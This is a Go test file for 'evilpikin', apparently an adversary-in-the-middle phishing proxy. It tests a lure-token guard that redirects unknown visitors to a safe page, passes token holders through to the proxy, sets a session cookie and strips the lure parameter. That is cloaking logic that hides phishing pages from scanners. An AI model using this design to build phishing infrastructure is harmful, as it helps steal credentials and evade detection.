package proxy

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/user/evilpikin/internal/storage"
	"github.com/user/evilpikin/pkg/lures"
)

// TestEngineLureGuard verifies the live engine's tracking-matrix guard: with
// RequireLure enabled, unknown visitors are bounced (302) while a valid lure
// token is allowed through to the proxy (any non-302 code proves the guard
// released the request to the handler).
func TestEngineLureGuard(t *testing.T) {
	engine := NewEngine()
	engine.SetSiteDomain("evilpikin.test")

	// A default resolver that maps any host to a local origin so the guard can
	// hand off to the proxy (we only assert on guard behavior, not upstream).
	engine.SetDefaultTargetResolver(func(sni string) (*storage.TargetProfile, bool) {
		return &storage.TargetProfile{
			ID: "t", Name: "t", Enabled: true,
			ProxyHost: sni, Origin: "127.0.0.1:9", ForceHTTPS: false,
		}, true
	})

	reg := lures.NewRegistry()
	l, err := reg.Create("reset", "evilpikin.test", "")
	if err != nil {
		t.Fatal(err)
	}
	engine.SetLures(reg)
	engine.SetRequireLure(true)

	// Unknown visitor (no token, no cookie) must be bounced to the safe sink.
	req := httptest.NewRequest("GET", "http://evilpikin.test/", nil)
	req.Host = "evilpikin.test"
	rec := httptest.NewRecorder()
	h, herr := engine.HandlerFor("evilpikin.test")
	if herr != nil {
		t.Fatalf("HandlerFor: %v", herr)
	}
	h.ServeHTTP(rec, req)
	if rec.Code != http.StatusFound {
		t.Fatalf("expected 302 bounce for unknown visitor, got %d", rec.Code)
	}
	if loc := rec.Header().Get("Location"); loc != lures.DefaultSafeRedirect {
		t.Fatalf("bounce location = %q", loc)
	}

	// Valid lure token must pass the guard (reaches proxy -> not a 302 bounce).
	req2 := httptest.NewRequest("GET", "http://evilpikin.test/reset?id="+l.ID, nil)
	req2.Host = "evilpikin.test"
	rec2 := httptest.NewRecorder()
	h.ServeHTTP(rec2, req2)
	if rec2.Code == http.StatusFound {
		t.Fatal("valid lure token was bounced; guard should have released it")
	}
	if !strings.Contains(rec2.Header().Get("Set-Cookie"), lures.SessionCookieName) {
		t.Fatal("EP_SESS cookie not set on valid lure hit")
	}

	// Lure param must be stripped from the forwarded request.
	if req2.URL.Query().Get(lures.DefaultParamName) != "" {
		t.Fatal("lure param not stripped from request")
	}
}

// TestEngineLureGuardInertWithoutRegistry ensures the guard is a no-op when no
// registry is attached (default, backward-compatible behavior).
func TestEngineLureGuardInertWithoutRegistry(t *testing.T) {
	engine := NewEngine()
	engine.SetSiteDomain("evilpikin.test")
	engine.SetDefaultTargetResolver(func(sni string) (*storage.TargetProfile, bool) {
		return &storage.TargetProfile{ID: "t", Enabled: true, ProxyHost: sni, Origin: "127.0.0.1:9"}, true
	})
	// No SetLures call -> guard must not interfere.
	req := httptest.NewRequest("GET", "http://evilpikin.test/", nil)
	req.Host = "evilpikin.test"
	rec := httptest.NewRecorder()
	h, err := engine.HandlerFor("evilpikin.test")
	if err != nil {
		t.Fatal(err)
	}
	h.ServeHTTP(rec, req)
	if rec.Code == http.StatusFound {
		t.Fatal("guard bounced despite no registry configured")
	}
}
